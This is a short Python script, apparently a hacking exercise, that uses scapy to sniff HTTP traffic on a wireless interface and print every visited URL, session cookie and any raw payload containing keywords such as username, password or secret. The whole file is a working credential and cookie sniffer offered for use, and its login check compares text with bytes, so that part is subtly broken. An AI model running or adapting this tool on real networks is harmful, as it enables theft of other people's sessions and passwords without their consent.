import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_packet)

def captura_url(packet):
    url = packet[http.HTTPRequest].Path + packet[http.HTTPRequest].Host
    url = url.decode('utf-8') if url else None
    return url

def captura_cookies(packet):
    cookies = packet[http.HTTPRequest].Cookie
    cookies = cookies.decode('utf-8') if cookies else None
    return cookies
def captura_login(packet):#Só funciona em presença de RAW (muito raro)
    wordlist = ["uname", "login", "email", "username", "password", "pass", "user", "secret"]
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        if any(word in load for word in wordlist):
            return load

def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = captura_url(packet)
        cookies = captura_cookies(packet)
        login = captura_login(packet)
        if url:
            print("\nURL: " + url)
        if cookies:
            print("\nCOOKIES:" + cookies)
        if login:
            print("\nLOGIN: " + str(login))


sniff("wlan0")
